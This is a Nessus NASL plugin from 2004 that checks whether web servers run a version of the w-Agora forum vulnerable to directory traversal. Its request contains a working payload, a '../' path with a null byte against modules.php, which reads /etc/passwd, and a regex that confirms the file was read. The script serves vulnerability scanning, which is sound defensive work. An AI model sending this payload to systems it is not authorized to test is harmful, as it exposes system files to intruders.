#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  based on work from
#  (C) Tenable Network Security
#
#  Ref: sonyy@2vias.com.ar
#
#  This script is released under the GNU GPLv2
#

if (description) {
  script_id(15437);
  script_bugtraq_id(6595);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"3012");
  script_version("$Revision: 1.2 $");
 
  name["english"] = "w-Agora remote directory traversal flaw";
  script_name(english:name["english"]);
 
  desc["english"] = "
The remote host is running w-agora, a web-based forum management software
written in PHP.

The remote version of this software is prone to directory traversal attacks.
An attacker could send specially crafted URL to read arbitrary files on 
the remote system with the privileges of the web server process.

Solution : Upgrade to the newest version of this software
Risk factor : Medium";

  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for directory traversal in w-Agora";
  script_summary(english:summary["english"]);
 
  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) 2004 David Maciejak");

  family["english"] = "CGI abuses";
  script_family(english:family["english"]);

  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 req = string(dir, "/modules.php?mod=fm&file=../../../../../../../../../../etc/passwd%00&bn=fm_d1");
 req = http_get(item:req, port:port);
 result = http_keepalive_send_recv(port:port, data:req);
 if(result == NULL) exit(0);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:result))security_warning(port);
}
